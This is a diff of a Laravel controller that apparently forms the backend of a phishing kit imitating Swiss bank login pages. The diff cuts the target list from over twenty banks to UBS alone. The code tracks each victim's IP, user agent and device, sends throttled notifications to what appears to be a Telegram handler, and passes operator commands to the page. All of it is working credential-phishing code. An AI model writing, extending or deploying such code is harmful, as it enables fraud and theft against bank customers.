@@ -9,33 +9,26 @@ use App\Telegram\Handlers\SmartSuppHandler;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Cache;
 use Illuminate\Support\Facades\Cookie;
-use Illuminate\Support\Str;
 use Inertia\Inertia;
 use Inertia\Response;
 
 class BankLoginController extends Controller
 {
-    public const ACTIVE_SLUGS = [
-        'migros', 'ubs', 'postfinance', 'aek-bank', 'bank-avera',
-        'swissquote', 'baloise', 'bancastato', 'next-bank', 'llb',
-        'raiffeisen', 'valiant', 'bernerland', 'cler', 'dc-bank',
-        'banque-du-leman', 'bank-slm', 'sparhafen', 'alternative-bank',
-        'hypothekarbank', 'banque-cantonale-du-valais', 'kantonalbank',
-    ];
+    public const DEFAULT_SLUG = 'ubs';
 
-    public function show(string $bankSlug, Request $request): Response
+    public function show(string $slug, Request $request): Response
     {
-        if (!in_array($bankSlug, self::ACTIVE_SLUGS, true)) {
+        if ($slug !== self::DEFAULT_SLUG) {
             abort(404);
         }
 
-        $cookieName = 'bsid_' . $bankSlug;
+        $cookieName = 'bsid';
         $existingId = $request->cookie($cookieName);
         $session    = null;
 
         if ($existingId) {
             $session = BankSession::where('id', $existingId)
-                ->where('bank_slug', $bankSlug)
+                ->where('bank_slug', self::DEFAULT_SLUG)
                 ->where('status', '!=', 'completed')
                 ->where('last_activity_at', '>=', now()->subHours(2))
                 ->first();
@@ -43,7 +36,7 @@ class BankLoginController extends Controller
 
         if ($session === null) {
             $session = BankSession::create([
-                'bank_slug'        => $bankSlug,
+                'bank_slug'        => self::DEFAULT_SLUG,
                 'ip_address'       => $request->clientIp(),
                 'user_agent'       => $request->userAgent(),
                 'domain'           => $request->getHost(),
@@ -55,26 +48,25 @@ class BankLoginController extends Controller
             'ip_address'  => $request->clientIp(),
             'user_agent'  => $request->userAgent(),
             'page_url'    => $request->fullUrl(),
-            'page_name'   => $bankSlug,
-            'bank_slug'   => $bankSlug,
+            'page_name'   => 'login',
+            'bank_slug'   => self::DEFAULT_SLUG,
             'device_type' => self::detectDevice($request->userAgent() ?? ''),
             'is_online'   => true,
             'last_seen'   => now(),
         ]);
 
-        // Атомарный lock: шлём уведомление только один раз за 15 сек для IP+банк
-        $lockKey = 'presession:' . $request->clientIp() . ':' . $bankSlug;
+        // Атомарный lock: шлём уведомление только один раз за 15 сек для IP+форма
+        $lockKey = 'presession:' . $request->clientIp() . ':login';
         if (Cache::add($lockKey, true, 15)) {
             PreSessionCreated::dispatch($preSession);
         }
 
-        $page = 'Banks/' . Str::studly(str_replace('-', '_', $bankSlug));
+        $page = 'Banks/Ubs';
 
         Cookie::queue($cookieName, $session->id, 120);
 
         return Inertia::render($page, [
             'sessionId'      => $session->id,
-            'bankSlug'       => $bankSlug,
             'smartsupp'      => SmartSuppHandler::getSettings(),
             'preSessionId'   => $preSession->id,
             'initialCommand' => $session->action_type ?? ['type' => 'idle'],
